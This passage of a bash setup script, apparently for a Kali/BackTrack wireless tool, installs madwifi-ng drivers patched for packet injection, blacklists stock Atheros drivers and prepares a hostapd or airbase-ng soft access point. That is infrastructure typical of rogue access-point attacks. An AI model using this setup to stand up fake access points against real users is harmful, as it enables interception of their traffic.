						modprobe -r ath9k
						modprobe -r ath
						$cecho ""$GREEN"Done..."$END""
						#$cecho ""$RED"Removing ath5, ath9k and ath kernel modules from your system"$END""
						#rm -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath5k
						#rm -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath9k
						#rm -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath.ko
						#$cecho ""$GREEN"Done..."$END""
						cd $HOME_DIR/madwifi-ng/scripts
						./madwifi-unload
						./find-madwifi-modules.sh $(uname -r)
						cd $HOME_DIR/madwifi-ng
						$cecho ""$RED"Installing..."$END""
						make install
						$cecho ""$RED"Unblacklisting madwifi-ng driver (ath_pci)"$END""
						sed 's%blacklist ath_pci%#blacklist ath_pci%g' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						sed 's%blacklist ath_pci%#blacklist ath_pci%g' /etc/modprobe.d/$blklist_file2 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file2
						sed '$ a\ath_pci' /etc/modules > /etc/modules1 && mv /etc/modules1 /etc/modules
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Blacklisting ath, ath5k, ath9k driver"$END""
						sed '$ a\blacklist ath5k' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						sed '$ a\blacklist ath9k' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						sed '$ a\blacklist ath' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						$cecho ""$GREEN"Done..."$END""
						depmod -aq
						echo
						$cecho ""$RED"Loading drivers...."$END""
						modprobe ath_pci autocreate=none
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Bringing wireless interface up..."$END""
						ifconfig wifi0 up
						$cecho ""$GREEN"Done..."$END""
						sed 's%WIRELS_IFACE.*%WIRELS_IFACE wifi0%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%WIFACE_MON.*%WIFACE_MON%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$GREEN"Installation complete"$END""
						echo 
						$cecho ""$RED"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
						echo "!Notice that your wireless interface name from now will be wifi0!"
						echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"$END""
						echo
						read -p 'Press ENTER to continue...' string;echo
						clear
					else
						clear
						$cecho ""$RED"Installing madwifi-ng drivers revision 4180"$END""
						echo
						$cecho ""$RED"Wireless interface down..."$END""
						ifconfig $WIFACE down
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Unloading drivers..."$END""
						modprobe -r ath5k
						modprobe -r ath9k
						modprobe -r ath
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Making a backup copy of ath5k, ath9k and ath kernel modules to $HOME_DIR/backup/"$END""
						mkdir $HOME_DIR/backup/ath 
						cp -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath5k $HOME_DIR/backup/ath
						cp -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath9k $HOME_DIR/backup/ath
						cp -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath.ko $HOME_DIR/backup/ath/ath.ko
						$cecho ""$GREEN"Done..."$END""
						#$cecho ""$RED"Removing ath5k, ath9k and ath kernel modules from your system"$END""
						#rm -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath5k
						#rm -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath9k
						#rm -r /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath.ko
						#$cecho ""$GREEN"Done..."$END""
							if [ ! -d /usr/src/linux-headers-"`uname -r`" ];then
								$cecho ""$RED"Downloading - Installing Linux Headers "`uname -r`""$END""
								apt-get install -y linux-headers-"`uname -r`"
								$cecho ""$GREEN"Done..."$END""
							else
								$cecho ""$RED"Linux Headers "`uname -r`" already installed"$END""
							fi
						cp /usr/src/linux-headers-"`uname -r`"/Module.symvers /usr/src/linux-source-"`uname -r`"/
							if [ ! -d $HOME_DIR/madwifi-ng ];then
								$cecho ""$RED"Downloading madwifi-ng drivers..."$END""
									if [ "$OS" = "BackTrack_5R3" ];then
										wget http://snapshots.madwifi-project.org/madwifi-trunk/madwifi-trunk-r4181-20140204.tar.gz
										tar xf madwifi-trunk-r4181-20140204.tar.gz
										mv madwifi-trunk-r4181-20140204 madwifi-ng
									elif [ "$OS" = "KALI_linux" ];then
										git clone https://github.com/proski/madwifi $HOME_DIR/madwifi-ng
									fi
								$cecho ""$GREEN"Done..."$END""
								cd $HOME_DIR/
								$cecho ""$RED"Downloading madwifi-ng patch for injection from aircrack-ng"$END""
								wget http://patches.aircrack-ng.org/madwifi-ng-r4073.patch
								$cecho ""$GREEN"Done..."$END""
								echo
								$cecho ""$RED"Patching madwifi-ng drivers for injection..."$END""
								patch -N -p 0 -i madwifi-ng-r4073.patch
								rm $HOME_DIR/madwifi-ng-r4073.patch
								$cecho ""$GREEN"Done..."$END""
							else 
								$cecho ""$RED"Madwifi-ng drivers revision 4181 already downloaded and patched"$END""
							fi
						cd $HOME_DIR/madwifi-ng
						$cecho ""$RED"Unloading drivers..."$END""
						./scripts/madwifi-unload
						./scripts/find-madwifi-modules.sh $(uname -r)
						$cecho ""$GREEN"Done..."$END""
						echo
						$cecho ""$RED"Compiling..."$END""
						make
						$cecho ""$GREEN"Done..."$END""
						echo
						$cecho ""$RED"Installing drivers..."$END""
						make install
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Making a backup of madwifi-ng drivers into $HOME_DIR/backup/"$END""
						cp -r /lib/modules/`uname -r`/net/ $HOME_DIR/backup/
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Unblacklisting madwifi-ng driver (ath_pci)"$END""
						sed 's%blacklist ath_pci%#blacklist ath_pci%g' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						sed 's%blacklist ath_pci%#blacklist ath_pci%g' /etc/modprobe.d/$blklist_file2 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file2
						sed '$ a\ath_pci' /etc/modules > /etc/modules1 && mv /etc/modules1 /etc/modules
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Blacklisting ath5k driver"$END""
						sed '$ a\blacklist ath5k' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						sed '$ a\blacklist ath9k' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						sed '$ a\blacklist ath' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						$cecho ""$GREEN"Done..."$END""
						echo
						depmod -aq
						echo
						$cecho ""$RED"Loading drivers..."$END""
						modprobe ath_pci autocreate=none
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Bringing wireless interface up..."$END""
						ifconfig wifi0 up
						sed 's%WIRELS_IFACE.*%WIRELS_IFACE wifi0%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%WIFACE_MON.*%WIFACE_MON%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$GREEN"Installation complete"$END""
						echo 
						$cecho ""$RED"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
						echo "!Notice that your wireless interface name from now will be wifi0!"
						echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"$END""
						echo
						read -p 'Press ENTER to continue...' string;echo
						clear
					fi
				fi
			else
				clear
				YN=3
				$cecho "You have a "$GREEN""`lspci | grep 'Atheros' | grep 'Wireless' | grep 'Network' | awk '{print $4" "$5" "$6" "$7" "$8" "$9" "$10" "$11" "$12" "$13}'`""$END" based card and madwifi-ng aren't installed"
				echo "To use master mode, they must be installed. Would like to:"
				echo
				echo "1. Install madwifi-ng (revision 4181 - patched for injection). "
				echo "2. Continue (Using the existing drivers)."
				echo
				echo "-----------------------------------------------------------------------------"
				$cecho ""$RED"Master mode compatible cards at http://madwifi-project.org/wiki/Compatibility"$END""
				echo "-----------------------------------------------------------------------------"
				echo
				$cecho ""$RED"! ! ! Wrong input ! ! !"$END""
				$necho "Please enter your choice (1 - 2): "
			fi
		done
fi


#################################################################################################################
# 		If our wireless interface is using madwifi-ng drivers will we will use master mode,		#
# 					monitor mode or hostapd for the SoftAP?					#
#														#
# 					DON'T TRY IT IN KALI!!!!						#
#################################################################################################################
if [ -n "$ATH" ] && [ -f /lib/modules/`uname -r`/net/ath_pci.ko ];then
	clear
	YN=4
	$cecho "You have a "$GREEN""`lspci | grep 'Atheros' | grep 'Wireless' | grep 'Network' | awk '{print $4" "$5" "$6" "$7" "$8" "$9" "$10" "$11" "$12" "$13}'`""$END" based card and madwifi-ng drivers are currently installed"
	echo "You have three option for the creation of the SoftAP "
	echo 
	echo "1. Master mode based SoftAP"
	echo "2. Hostapd based SoftAP"
	echo "3. Airbase-ng based SoftAP"

	echo
	$necho "Please enter your choice ( 1 - 3 ): "
		while [ "$YN" = "4" ];do
			read YN
				if [ "$YN" = "1" ] || [ "$YN" = "2" ] || [ "$YN" = "3" ];then
					if [ "$YN" = "1" ];then
						export ATHDRV="master"
						export WIFACE="wifi0"
						export ATFACE="ath0"
						export WIFACE_MON="ath0"
							if [ "`/sbin/ifconfig | grep "$WIFACE_MON" | awk '{print $1}'`" = "$WIFACE_MON" ];then
								wlanconfig "$WIFACE_MON" destroy
							fi
						wlanconfig "$WIFACE_MON" create wlandev "$WIFACE" wlanmode master
						sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					fi
					if [ "$YN" = "3" ];then
						export ATHDRV="monitor"
						export WIFACE="wifi0"
						export ATFACE="at0"
						export WIFACE_MON="ath0"
							if [ "`/sbin/ifconfig | grep "$WIFACE_MON" | awk '{print $1}'`" = "$WIFACE_MON" ];then
								wlanconfig "$WIFACE_MON" destroy
							fi
						wlanconfig "$WIFACE_MON" create wlandev "$WIFACE" wlanmode monitor
						sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					fi
					if [ "$YN" = "2" ];then
						export ATHDRV="hostapd_madwifi"
						export WIFACE="wifi0"
						export ATFACE="ath0"
						export WIFACE_MON="ath0"
							if [ "`/sbin/ifconfig | grep "$WIFACE_MON" | awk '{print $1}'`" = "$WIFACE_MON" ];then
								wlanconfig "$WIFACE_MON" destroy
								sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							fi
						wlanconfig "$WIFACE_MON" create wlandev "$WIFACE" wlanmode ap
					fi
				else
					YN=4
					clear
					$cecho "You have a "$GREEN""`lspci | grep 'Atheros' | grep 'Wireless' | grep 'Network' | awk '{print $4" "$5" "$6" "$7" "$8" "$9" "$10" "$11" "$12" "$13}'`""$END" based card and madwifi-ng drivers are currently installed"
					echo "You have three option for the creation of the SoftAP "
					echo 
					echo "1. Master mode based SoftAP"
					echo "2. Hostapd based SoftAP"
					echo "3. Airbase-ng based SoftAP"
					echo
					$cecho ""$RED"! ! ! Wrong input ! ! !"$END""
					$necho "Please enter your choice (1 - 3): "
				fi
		done
else
	export ATHDRV="no"
	export ATFACE="at0"
fi

#################################################################################################################
# 				HOSTAPD - AIRBASE-NG based SoftAP						#
#														#
# 		Well, no madwifi drivers will be used. Let's use what we have. (Current drivers)		#
# 	If no madwifi-ng found-installed then we will use current drivers and airbase-ng or hostapd		#
# 		Save monitor mode interface in $HOME_DIR/aerial.conf file so we can use it next time.		#
#################################################################################################################

IEEE_802_11a(){
iwlist $WIFACE channel | grep "Channel " | grep -v "Current Frequency" | sed -e 's/.*Channel //' -e 's/ :.*$//' >> $HOME_DIR/channels
if [ -n "`grep "36" $HOME_DIR/channels`" ] || [ -n "`grep "40" $HOME_DIR/channels`" ] || [ -n "`grep "44" $HOME_DIR/channels`" ] || [ -n "`grep "48" $HOME_DIR/channels`" ] || [ -n "`grep "52" $HOME_DIR/channels`" ] || [ -n "`grep "56" $HOME_DIR/channels`" ] || [ -n "`grep "60" $HOME_DIR/channels`" ] || [ -n "`grep "64" $HOME_DIR/channels`" ] || [ -n "`grep "100" $HOME_DIR/channels`" ] || [ -n "`grep "104" $HOME_DIR/channels`" ] || [ -n "`grep "108" $HOME_DIR/channels`" ] || [ -n "`grep "112" $HOME_DIR/channels`" ] || [ -n "`grep "116" $HOME_DIR/channels`" ] || [ -n "`grep "120" $HOME_DIR/channels`" ] || [ -n "`grep "124" $HOME_DIR/channels`" ] || [ -n "`grep "128" $HOME_DIR/channels`" ] || [ -n "`grep "132" $HOME_DIR/channels`" ] || [ -n "`grep "136" $HOME_DIR/channels`" ] || [ -n "`grep "140" $HOME_DIR/channels`" ] || [ -n "`grep "149" $HOME_DIR/channels`" ] || [ -n "`grep "153" $HOME_DIR/channels`" ] || [ -n "`grep "157" $HOME_DIR/channels`" ] || [ -n "`grep "161" $HOME_DIR/channels`" ] || [ -n "`grep "165" $HOME_DIR/channels`" ];then
	$cecho "IEEE 802.11a 5GHZ    :          "$GREEN"Supported"$END""
else
	$cecho "IEEE 802.11a 5GHz    :        "$RED"Not supported"$END""
fi
}

IEEE_802_11g(){
if [ -n "`grep "01" $HOME_DIR/channels`" ] || [ -n "`grep "02" $HOME_DIR/channels`" ] || [ -n "`grep "03" $HOME_DIR/channels`" ] || [ -n "`grep "04" $HOME_DIR/channels`" ] || [ -n "`grep "05" $HOME_DIR/channels`" ] || [ -n "`grep "06" $HOME_DIR/channels`" ] || [ -n "`grep "07" $HOME_DIR/channels`" ] || [ -n "`grep "08" $HOME_DIR/channels`" ] || [ -n "`grep "09" $HOME_DIR/channels`" ] || [ -n "`grep "10" $HOME_DIR/channels`" ] || [ -n "`grep "11" $HOME_DIR/channels`" ] || [ -n "`grep "12" $HOME_DIR/channels`" ] || [ -n "`grep "13" $HOME_DIR/channels`" ] || [ -n "`grep "14" $HOME_DIR/channels`" ];then
	$cecho "IEEE 802.11g 2.4GHz  :          "$GREEN"Supported"$END""
else
	$cecho "IEEE 802.11g 2.4GHz  :        "$RED"Not supported"$END""
fi
}


IEEE_802_11n(){
if [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ];then
	export ieee80211n="1"
	$cecho "IEEE 802.11n HT      :          "$GREEN"Supported"$END""
elif [ -n "`iw $PHY info | grep -o "HT20"`" ];then
	export ieee80211n="1"	
	$cecho "IEEE 802.11n HT      :          "$GREEN"Supported"$END""
elif [ -n "`iw $PHY info | grep -o "HT40"`" ];then
	export ieee80211n="1"
	$cecho "IEEE 802.11n HT      :          "$GREEN"Supported"$END""
else
	$cecho "IEEE 802.11n HT      :        "$RED"Not supported"$END""
	export ieee80211n="0"
	export ht_capab="NONE"
	sed 's%IEEE_802_11n.*%IEEE_802_11n disabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
fi
}

AP_SUPPORTED(){
if [ -n "`iw $PHY info | grep "* AP" | grep -v "* AP/VLAN* AP"`" ];then
	echo
	#$cecho "AP mode (hostapd)    :          "$GREEN"Supported"$END""
	$cecho ""$GREEN"CAN"$END" support Access Point mode (hostapd compatible):"$END""
	echo
	$cecho "   Hostapd mode      :           Status"
	IEEE_802_11a
	IEEE_802_11g
	IEEE_802_11n
else
	echo
	#$cecho "AP mode (hostapd)    :        "$RED"Not supported"$END""
	$cecho ""$RED"CANNOT"$END" support Access Point mode (not compatible with hostapd) and"
fi
}

MONITOR_SUPPORTED(){
if [ -n "`iw $PHY info | grep "* monitor"`" ];then
	echo
	echo
	#$cecho "Monitor mode (airbase-ng) :     "$GREEN"Supported"$END""
	$cecho ""$GREEN"CAN"$END" support monitor mode (airbase-ng compatible):"
	echo
	$cecho "  Airbase-ng mode    :           Status"
	IEEE_802_11a
	IEEE_802_11g
	rm $HOME_DIR/channels
else
	echo
	echo
	#$cecho "Monitor mode (airbase-ng) : "$GREEN"Not supported"$END""
	$cecho ""$RED"CANNOT"$END" support monitor mode (not compatible with airbase-ng)"
	rm $HOME_DIR/channels
fi
}

WIFACE_MON_HEAD(){ 
clear
$cecho ""$BLUE"A i r b a s e - n g :"$END"" | centered_text
echo
$cecho ""$BLUE"M o n i t o r  M o d e  I n t e r f a c e"$END"" | centered_text
echo
echo
# Stop any running interfaces in monitor mode
for i in $(seq 1 "`ls /sys/class/net | grep "mon" | wc -l`")
	do 
		if [ -n "`ls /sys/class/net | grep "mon" | head -1`" ];then
			export WIFACE_MON_stop="`ls /sys/class/net | grep "mon" | head -1`"
			$necho "[....] Stopping wireless interface No"`expr $c + 1`" in monitor mode"
			eval $aircrack_path/airmon-ng stop $WIFACE_MON_stop $no_out
			$cecho "\r[ "$GREEN"ok"$END" ] Stopping wireless interface "$WIFACE_MON_stop" in monitor mode"
		fi
	c="`expr $c + 1`"
	done
}

WIFACE_MON_MENU(){ 
if [ -n "`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "$WIFACE" != "`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
	export WIFACE_MON="`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`"
	$necho "[....] Starting wireless interface "$WIFACE" in monitor mode"
	eval $aircrack_path/airmon-ng start $WIFACE $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Starting wireless interface "$WIFACE" in monitor mode"
	echo
	echo "To start a SoftAP based on airbase-ng your wireless interface"
	$cecho "must be in "$RED"monitor mode"$END""
	echo
	echo "It looks like:"
	$cecho ""$GREEN""$WIFACE_MON""$END" is the interface in monitor mode"
	$cecho "If this is correct you can press ENTER"
	echo
	echo "Available interface(s) are:"
	$cecho "$GREEN""`ls /sys/class/net | grep -v "lo" | grep "mon"`""$END"
	echo
	$cecho "Please enter your wireless interface in "$RED"MONITOR MODE"$END" [e.g. "$GREEN"mon0"$END" ]"
	$necho "Press ENTER for current ("$GREEN""$WIFACE_MON""$END"): "
else
	$necho "[....] Starting wireless interface "$WIFACE" in monitor mode"
	eval $aircrack_path/airmon-ng start $WIFACE $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Starting wireless interface "$WIFACE" in monitor mode"
	export WIFACE_MON="`ls /sys/class/net | grep "mon" | head -1`"
	echo
	echo "To start a SoftAP based on airbase-ng your wireless interface"
	$cecho "must be in "$RED"monitor mode"$END""
	echo
	echo "It looks like:"
	$cecho ""$GREEN""$WIFACE_MON""$END" is the interface in monitor mode"
	$cecho "If this is correct you can press ENTER"
	echo
	echo "Available interface(s) are:"
	$cecho "$GREEN""`ls /sys/class/net | grep -v "lo" | grep "mon"`""$END"
	echo
	$cecho "Please enter your wireless interface in "$RED"MONITOR MODE"$END" [e.g. "$GREEN"mon0"$END" ]"
	$necho "Press ENTER for current ("$GREEN""$WIFACE_MON""$END"): "
fi
}

HOST_AIRBASE_MENU(){ 
	clear
	$cecho ""$BLUE"H o s t a p d  -  A i r b a s e - n g  -  M E N U:"$END"" | centered_text
	echo
	echo
	$cecho ""$END"You have a "$GREEN""`ls /sys/class/net/$WIFACE/device/driver/module/drivers`""$END" wireless NIC, which it looks like it:"
	AP_SUPPORTED
	MONITOR_SUPPORTED
	echo
	echo "Either way you have two options to try, for the creation of the SoftAP "
	echo 
	echo "1. Hostapd based SoftAP"
	echo "2. Airbase-ng based SoftAP"
	echo
}

RESTORE_MON(){ 
	cp $HOME_DIR/backup/interfaces /etc/network/interfaces 
	service network-manager stop
	service networking stop
	service networking start
	service network-manager start
	sleep 1
	$necho "[....] Waiting to connect again to the Internet."
		until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
			for i in \| / - \\; do
				printf ' [%c]\b\b\b\b' $i 
				sleep .1 
			done 
		done
	$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "

}

RESET_80211n(){
if [ "`grep 'IEEE_802_11n' $HOME_DIR/aerial.conf | awk '{print $2}'`" = "enabled" ] || [ -n "`grep 'HT_CAPAB' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
	sed 's%IEEE_802_11n.*%IEEE_802_11n disabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
fi

}
if [ -n "`grep 'WIFACE_MON' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
	export WIFACE_MON="`grep 'WIFACE_MON' $HOME_DIR/aerial.conf | awk '{print $2}'`"
fi

if [ "$ATHDRV" = "no" ] && [ "$HOSTAP_AIRBASE_PROMPT" = "no" ] && [ -n "$WIFACE" ] && [ -n "$WIFACE_MON" ] && [ "$WIFACE_MON" = "$WIFACE" ] && [ "$WIFACE_MON" != "$IFACE" ];then
		if [ "`grep 'IEEE_802_11n' $HOME_DIR/aerial.conf | awk '{print $2}'`" = "enabled" ];then
			export ieee80211n="1"
			export ht_capab="`grep 'HT_CAPAB' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		elif [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ] || [ -n "`iw $PHY info | grep -o "HT20"`" ] || [ -n "`iw $PHY info | grep -o "HT40"`" ];then
			export ieee80211n="1"
		else
			export ieee80211n="0"
			export ht_capab="NONE"
		fi
	export ATHDRV="hostapd"
	export ATFACE="$WIFACE"
	export WIFACE_MON="$WIFACE"
	sed 's%WIRELS_IFACE.*%WIRELS_IFACE '$WIFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
elif [ "$ATHDRV" = "no" ] && [ "$HOSTAP_AIRBASE_PROMPT" = "no" ] && [ -n "$WIFACE" ] && [ -n "$WIFACE_MON" ] && [ "$WIFACE_MON" != "$WIFACE" ] && [ "$WIFACE_MON" != "$IFACE" ];then
	export WIFACE_MON="`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`"
	export ieee80211n="0"
	export ht_capab="NONE"
	sed 's%IEEE_802_11n.*%IEEE_802_11n disabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
else
	while :
		do
		HOST_AIRBASE_MENU
		$cecho ""$BLUE"Supported drivers: http://wireless.kernel.org/en/users/Drivers"$END""
		$necho "Please enter your choice ( 1 - 2 ): "
		read opt
			case $opt in
				1)
					export ATHDRV="hostapd"
					export ATFACE="$WIFACE"
					export WIFACE_MON="$WIFACE"
					sed 's%WIRELS_IFACE.*%WIRELS_IFACE '$WIFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					break
				;;
				2)
					#################################################################################################################
					# 						Airbase-ng monitor Mode						#
					#################################################################################################################
					if [ -n "`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "$WIFACE" != "`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ -n "`ls /sys/class/net | grep "$WIFACE_MON"`" ];then
						export WIFACE_MON="`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`"
						export ieee80211n="0"
						export ht_capab="NONE"
						RESTORE_MON
						RESET_80211n
						sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						break
					else
						WIFACE_MON_HEAD
						WIFACE_MON_MENU
						while read WIFACE_MON
							do
								if [ -z "${WIFACE_MON}" ] && [ -n "`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "$WIFACE" != "`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
									export WIFACE_MON="`grep "WIFACE_MON" $HOME_DIR/aerial.conf | awk '{print $2}'`"
									export ieee80211n="0"
									export ht_capab="NONE"
									RESTORE_MON
									RESET_80211n
									sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									sed 's%IEEE_802_11n.*%IEEE_802_11n disabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									break
								elif [ -z "${WIFACE_MON}" ] && [ -n "`ls /sys/class/net | grep "mon" | head -1`" ];then
									export WIFACE_MON="`ls /sys/class/net | grep "mon" | head -1`"
									export ieee80211n="0"
									export ht_capab="NONE"
									RESTORE_MON
									RESET_80211n
									sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									break
								elif [ -z "${WIFACE_MON}" ];then
									WIFACE_MON_HEAD
									echo
									$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
									$cecho ""$RED"You must enter monitor mode interface"$END""
									echo
									WIFACE_MON_MENU
								elif [ -n "`ls /sys/class/net | grep "$WIFACE_MON"`" ];then
									export WIFACE_MON="`ls /sys/class/net | grep -v "lo" | grep "$WIFACE_MON"`"
									export ieee80211n="0"
									export ht_capab="NONE"
									RESTORE_MON
									RESET_80211n
									sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									break
								elif [ ! -n "`ls /sys/class/net | grep "$WIFACE_MON"`" ];then
									WIFACE_MON_HEAD
									echo
									$cecho "Wireless interface "$RED""$WIFACE_MON""$END" not found in your system"
									echo "Please check the name again"
									echo
									WIFACE_MON_MENU
								else
									WIFACE_MON_HEAD
									echo
									$cecho "Wireless interface "$RED""$WIFACE_MON""$END" not found in your system"
									echo "Please check the name again"
									echo
									WIFACE_MON_MENU
								fi
							done
						fi
					break
				;;
				"")
					HOST_AIRBASE_MENU
					$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
					read -p 'Press ENTER to continue...' string
				;;			
				*)
					HOST_AIRBASE_MENU
					$cecho "! ! ! "$RED""$opt""$END" is an invalid option ! ! !"
					$cecho "Please select option between 1-2 only"
					read -p 'Press ENTER to continue...' string
				;;
			esac
	done
fi

#################################################################################################################
